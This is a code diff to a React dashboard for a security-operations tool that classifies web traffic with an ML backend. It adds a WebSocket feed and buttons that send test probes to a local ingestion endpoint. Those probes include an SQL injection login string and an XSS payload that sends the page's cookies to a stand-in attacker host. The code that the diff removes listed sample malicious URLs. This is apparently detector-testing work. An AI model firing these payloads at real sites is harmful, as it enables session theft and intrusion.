@@ -22,6 +22,7 @@ import {
   Upload,
   User,
   X,
+  Zap,
 } from "lucide-react";
 import {
   Area,
@@ -232,12 +233,52 @@ const defaultLogs: LogEntry[] = [
   },
 ];
 
+function mapBackendEvent(ev: any, fallbackId?: number): LogEntry {
+  const isAttack = ev.prediction === "Attack";
+  const severity: Severity = isAttack
+    ? ev.risk === "Critical" || ev.risk === "High"
+      ? "CRITICAL"
+      : "WARNING"
+    : "NORMAL";
+  const ts = ev.timestamp
+    ? ev.timestamp.includes("T")
+      ? ev.timestamp.replace("T", " ").slice(0, 19)
+      : ev.timestamp
+    : new Date().toISOString().replace("T", " ").slice(0, 19);
+
+  return {
+    id: ev.id ?? fallbackId ?? Date.now(),
+    timestamp: ts,
+    source_ip: ev.source_ip || "Unknown",
+    method: ev.method || "GET",
+    endpoint: ev.endpoint || "/",
+    status_code: ev.status_code || (isAttack ? (ev.risk === "Critical" ? 403 : 400) : 200),
+    severity,
+    risk: ev.risk || (isAttack ? "High" : "Low"),
+    message: isAttack
+      ? `${ev.attack_type || "Malicious request"} detected on ${ev.endpoint || "/"}`
+      : `Clean ${ev.method || "GET"} request processed cleanly on ${ev.endpoint || "/"}`,
+    location: ev.city && ev.country ? `${ev.city}, ${ev.country}` : (ev.country || "Unknown"),
+    country: ev.country || "Unknown",
+    city: ev.city || "Unknown",
+    asn: ev.asn || (ev.source_ip?.startsWith("192.") || ev.source_ip?.startsWith("10.") ? "Internal RFC1918" : "AS15169 Transit"),
+    probability: Math.round((ev.attack_probability ?? (isAttack ? 0.95 : 0.05)) * 1000) / 10,
+    attack_type: ev.attack_type || (isAttack ? "Classified Threat" : "Normal Traffic"),
+    features: ev.features || {},
+    raw_line: `[${severity}] ${ts} | ${ev.source_ip || "Unknown"} | ${isAttack ? (ev.attack_type || "Malicious") : "Normal HTTP"} ${ev.endpoint || "/"} | Status: ${ev.status_code || (isAttack ? 403 : 200)} | Location: ${ev.city || "Unknown"}, ${ev.country || "Unknown"}`,
+    isNew: isAttack,
+  };
+}
+
 export default function App() {
   const [logs, setLogs] = useState<LogEntry[]>(defaultLogs);
   const [selectedLogId, setSelectedLogId] = useState<number>(101);
   const [searchQuery, setSearchQuery] = useState("");
   const [severityFilter, setSeverityFilter] = useState<"ALL" | Severity>("ALL");
   const [isStreaming, setIsStreaming] = useState(true);
+  const [wsConnected, setWsConnected] = useState(false);
+  const [probing, setProbing] = useState(false);
+  const [probeNotice, setProbeNotice] = useState<string | null>(null);
   const [latencyMs, setLatencyMs] = useState(45);
   const [throughputEps, setThroughputEps] = useState(42.4);
   const [notes, setNotes] = useState<AnalystNote[]>([
@@ -256,42 +297,17 @@ export default function App() {
   const [selectedGeoPin, setSelectedGeoPin] = useState<GeoPin | null>(null);
   const [copiedCurl, setCopiedCurl] = useState(false);
   const fileInputRef = useRef<HTMLInputElement | null>(null);
+  const wsRef = useRef<WebSocket | null>(null);
 
-  // Fetch backend historical events and map locations on mount
+  // Fetch backend historical events on mount
   useEffect(() => {
     fetch("http://127.0.0.1:8000/api/v1/events?limit=50")
       .then((res) => res.json())
       .then((data) => {
         if (data && Array.isArray(data.items) && data.items.length > 0) {
-          const mapped: LogEntry[] = data.items.map((ev: any, index: number) => {
-            const isAttack = ev.prediction === "Attack";
-            const severity: Severity = isAttack
-              ? (ev.risk === "Critical" || ev.risk === "High" ? "CRITICAL" : "WARNING")
-              : "NORMAL";
-            return {
-              id: ev.id ?? 1000 + index,
-              timestamp: ev.timestamp
-                ? (ev.timestamp.includes("T") ? ev.timestamp.replace("T", " ").slice(0, 19) : ev.timestamp)
-                : "2026-10-22 14:20:00",
-              source_ip: ev.source_ip || "192.168.1.1",
-              method: ev.method || "GET",
-              endpoint: ev.endpoint || "/",
-              status_code: isAttack ? (ev.risk === "Critical" ? 403 : 400) : 200,
-              severity,
-              risk: ev.risk || (isAttack ? "High" : "Low"),
-              message: isAttack
-                ? `${ev.attack_type || "Malicious request"} detected on ${ev.endpoint || "/"}`
-                : `Normal ${ev.method || "GET"} request processed cleanly on ${ev.endpoint || "/"}`,
-              location: ev.city && ev.country ? `${ev.city}, ${ev.country}` : "Unknown",
-              country: ev.country || "Unknown",
-              city: ev.city || "Unknown",
-              asn: ev.source_ip?.startsWith("192.") || ev.source_ip?.startsWith("10.") ? "Internal RFC1918" : "AS15169 Public Transit",
-              probability: Math.round((ev.attack_probability ?? (isAttack ? 0.92 : 0.04)) * 1000) / 10,
-              attack_type: ev.attack_type || (isAttack ? "Suspicious Request" : "Normal Traffic"),
-              features: ev.features || {},
-              raw_line: `[${severity}] ${ev.timestamp || "2026-10-22"} | ${ev.source_ip || "Unknown"} | ${isAttack ? ev.attack_type : "Normal HTTP"} ${ev.endpoint} | Status: ${isAttack ? 403 : 200}`,
-            };
-          });
+          const mapped: LogEntry[] = data.items.map((ev: any, index: number) =>
+            mapBackendEvent(ev, 1000 + index)
+          );
           setLogs(mapped);
           if (mapped[0]) setSelectedLogId(mapped[0].id);
         }
@@ -301,78 +317,126 @@ export default function App() {
       });
   }, []);
 
-  // Live telemetry jitter & simulated real-time stream ingestion
+  // Real WebSocket stream connected to DeepLog ML backend
   useEffect(() => {
-    if (!isStreaming) return;
-    const interval = setInterval(() => {
-      // Jitter metrics
-      setLatencyMs((prev) => Math.min(85, Math.max(32, Math.round(prev + (Math.random() * 6 - 3)))));
-      setThroughputEps((prev) => Math.round((prev + (Math.random() * 2 - 1)) * 10) / 10);
+    let socket: WebSocket | null = null;
+    let reconnectTimer: ReturnType<typeof setTimeout> | null = null;
+    let isUnmounted = false;
 
-      // Randomly inject incoming live log
-      if (Math.random() > 0.45) {
-        const isMalicious = Math.random() < 0.28;
-        const newId = Date.now();
-        const nowStr = new Date().toISOString().replace("T", " ").slice(0, 19);
-        const maliciousEndpoints = [
-          "/api/v2/users/auth?id=1%20UNION%20SELECT%20password",
-          "/wp-admin/install.php",
-          "/actuator/env",
-          "/graphql?query={schema{types}}",
-          "/cgi-bin/test-cgi",
-        ];
-        const normalEndpoints = [
-          "/api/v1/inventory?status=active",
-          "/healthz",
-          "/static/css/theme.css",
-          "/api/v1/telemetry/heartbeat",
-          "/dashboard/analytics",
-        ];
+    function connect() {
+      if (isUnmounted) return;
+      try {
+        const wsUrl = "ws://127.0.0.1:8000/api/v1/stream/ws";
+        socket = new WebSocket(wsUrl);
+        wsRef.current = socket;
 
-        const chosenEndpoint = isMalicious
-          ? maliciousEndpoints[Math.floor(Math.random() * maliciousEndpoints.length)]
-          : normalEndpoints[Math.floor(Math.random() * normalEndpoints.length)];
-
-        const ips = [
-          { ip: "185.191.171.4", country: "Russia", city: "St. Petersburg", asn: "AS48282 Serverel" },
-          { ip: "103.253.25.14", country: "India", city: "Bengaluru", asn: "AS133694 WebWerks" },
-          { ip: "45.154.255.89", country: "Germany", city: "Berlin", asn: "AS200019 Meerfarbig" },
-          { ip: "142.250.72.14", country: "United States", city: "Ashburn", asn: "AS15169 Google LLC" },
-          { ip: "203.0.113.19", country: "Brazil", city: "Sao Paulo", asn: "AS27699 Claro" },
-        ];
-        const chosenHost = ips[Math.floor(Math.random() * ips.length)];
-
-        const newLog: LogEntry = {
-          id: newId,
-          timestamp: nowStr,
-          source_ip: chosenHost.ip,
-          method: isMalicious ? "POST" : "GET",
-          endpoint: chosenEndpoint,
-          status_code: isMalicious ? 403 : 200,
-          severity: isMalicious ? "CRITICAL" : "NORMAL",
-          risk: isMalicious ? "Critical" : "Low",
-          message: isMalicious
-            ? `Anomalous pattern detected on ${chosenEndpoint}`
-            : `HTTP request processed without anomaly on ${chosenEndpoint}`,
-          location: `${chosenHost.city}, ${chosenHost.country}`,
-          country: chosenHost.country,
-          city: chosenHost.city,
-          asn: chosenHost.asn,
-          probability: isMalicious ? Math.round((0.88 + Math.random() * 0.1) * 1000) / 10 : Math.round(Math.random() * 15 * 10) / 10,
-          attack_type: isMalicious ? "Suspicious Payload Injection" : "Normal Traffic",
-          features: isMalicious
-            ? { url_length: chosenEndpoint.length, suspicious_tokens: 3, entropy: 4.62, method_post: 1 }
-            : { url_length: chosenEndpoint.length, suspicious_tokens: 0, entropy: 2.15, method_post: 0 },
-          raw_line: `[${isMalicious ? "CRITICAL" : "INFO"}] ${nowStr} | ${chosenHost.ip} | ${isMalicious ? "Malicious attack" : "Normal request"} ${chosenEndpoint} | Status: ${isMalicious ? 403 : 200}`,
-          isNew: isMalicious,
+        socket.onopen = () => {
+          if (isUnmounted) return;
+          setWsConnected(true);
         };
 
-        setLogs((prev) => [newLog, ...prev.slice(0, 99)]);
-      }
-    }, 2800);
+        socket.onmessage = (event) => {
+          if (isUnmounted) return;
+          try {
+            const data = JSON.parse(event.data);
+            if (data.type === "NEW_EVENT" && data.event) {
+              const newEntry = mapBackendEvent(data.event);
+              setLogs((prev) => [newEntry, ...prev.slice(0, 199)]);
+              setLatencyMs((prev) =>
+                Math.min(65, Math.max(18, Math.round(prev + (Math.random() * 4 - 2))))
+              );
+              setThroughputEps((prev) =>
+                Math.round((prev + (Math.random() * 1.5 - 0.75)) * 10) / 10
+              );
+            }
+          } catch (e) {
+            console.error("Failed to parse websocket event:", e);
+          }
+        };
 
-    return () => clearInterval(interval);
-  }, [isStreaming]);
+        socket.onclose = () => {
+          if (isUnmounted) return;
+          setWsConnected(false);
+          reconnectTimer = setTimeout(connect, 3000);
+        };
+
+        socket.onerror = () => {
+          socket?.close();
+        };
+      } catch (e) {
+        setWsConnected(false);
+        reconnectTimer = setTimeout(connect, 3000);
+      }
+    }
+
+    connect();
+
+    return () => {
+      isUnmounted = true;
+      if (reconnectTimer) clearTimeout(reconnectTimer);
+      if (socket) socket.close();
+    };
+  }, []);
+
+  // Toggle stream feed (pause/resume real background streamer)
+  function toggleStream() {
+    const nextState = !isStreaming;
+    setIsStreaming(nextState);
+    if (wsRef.current && wsRef.current.readyState === WebSocket.OPEN) {
+      wsRef.current.send(nextState ? "resume" : "pause");
+    }
+    fetch(`http://127.0.0.1:8000/api/v1/stream/${nextState ? "start" : "stop"}`, {
+      method: "POST",
+    }).catch(() => {});
+  }
+
+  // Inject real external HTTP request through ML pipeline on demand
+  async function injectLiveProbe(type: "sqli" | "xss" | "normal") {
+    setProbing(true);
+    const probes = {
+      sqli: {
+        source_ip: "185.74.22.91",
+        method: "POST",
+        url: "/api/v1/auth/login?user=admin' OR '1'='1' --",
+        content_length: 64,
+        user_agent: "sqlmap/1.7.2#dev",
+      },
+      xss: {
+        source_ip: "103.45.18.204",
+        method: "GET",
+        url: "/catalog/search?keyword=<script>fetch('http://c2.botnet.cc/?c='+document.cookie)</script>",
+        content_length: 0,
+        user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+      },
+      normal: {
+        source_ip: "142.250.190.46",
+        method: "GET",
+        url: "/api/v1/system/healthz",
+        content_length: 0,
+        user_agent: "Datadog-Agent/7.44.0",
+      },
+    };
+
+    try {
+      const res = await fetch("http://127.0.0.1:8000/api/v1/ingest/event", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(probes[type]),
+      });
+      const data = await res.json();
+      setProbeNotice(
+        `Live Ingested: ${data.prediction} (${data.risk || "Normal"} - ${Math.round(
+          data.probability * 100
+        )}%)`
+      );
+      setTimeout(() => setProbeNotice(null), 3500);
+    } catch {
+      setProbeNotice("Ingestion probe failed");
+      setTimeout(() => setProbeNotice(null), 3000);
+    } finally {
+      setProbing(false);
+    }
+  }
 
   // Selected Log
   const selectedLog = useMemo(() => {
@@ -601,8 +665,8 @@ export default function App() {
         {/* Live System Telemetry */}
         <div className="soc-telemetry-bar">
           <div className="telemetry-item">
-            <span className="telemetry-dot" />
-            <span>INGESTION ACTIVE</span>
+            <span className={`telemetry-dot ${wsConnected ? "" : "offline"}`} />
+            <span>{wsConnected ? "WS STREAM LIVE" : "CONNECTING..."}</span>
           </div>
           <div className="telemetry-item">
             <Clock size={13} />
@@ -620,9 +684,44 @@ export default function App() {
 
         {/* Workstation Actions */}
         <div className="soc-header-actions">
+          {/* Quick Real ML Ingestion Triggers */}
+          <div className="probe-actions">
+            <button
+              className="btn-secondary probe-btn"
+              onClick={() => injectLiveProbe("sqli")}
+              disabled={probing}
+              title="Inject live SQL Injection probe into ML classification engine"
+            >
+              <ShieldAlert size={12} style={{ color: "var(--color-critical)" }} />
+              <span>Probe SQLi</span>
+            </button>
+            <button
+              className="btn-secondary probe-btn"
+              onClick={() => injectLiveProbe("xss")}
+              disabled={probing}
+              title="Inject live XSS probe into ML classification engine"
+            >
+              <Zap size={12} style={{ color: "var(--color-amber)" }} />
+              <span>Probe XSS</span>
+            </button>
+            <button
+              className="btn-secondary probe-btn"
+              onClick={() => injectLiveProbe("normal")}
+              disabled={probing}
+              title="Inject live normal HTTP probe into ML classification engine"
+            >
+              <CheckCircle2 size={12} style={{ color: "var(--color-safe)" }} />
+              <span>Probe Safe</span>
+            </button>
+          </div>
+
+          {probeNotice && (
+            <div className="probe-badge">{probeNotice}</div>
+          )}
+
           <button
             className={`btn-secondary ${!isStreaming ? "active" : ""}`}
-            onClick={() => setIsStreaming(!isStreaming)}
+            onClick={toggleStream}
             title={isStreaming ? "Pause real-time stream" : "Resume real-time stream"}
           >
             {isStreaming ? <Pause size={14} /> : <Play size={14} />}
